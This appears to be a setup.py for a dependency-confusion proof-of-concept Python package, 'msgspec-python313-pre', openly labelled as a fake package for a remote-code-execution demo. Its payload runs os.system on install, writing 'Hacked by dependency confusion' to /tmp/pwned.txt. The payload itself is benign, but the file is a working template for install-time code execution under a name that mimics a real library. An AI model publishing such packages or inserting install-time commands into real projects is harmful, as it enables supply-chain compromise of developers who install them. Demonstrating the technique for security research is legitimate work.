from setuptools import setup
import os

# Simulated payload
os.system('echo "[+] RCE achieved! Writing to /tmp/pwned.txt"')
os.system('echo "Hacked by dependency confusion" > /tmp/pwned.txt')

setup(
    name='msgspec-python313-pre',
    version='0.1.0',
    description='Fake package for RCE demo',
    py_modules=[],
)

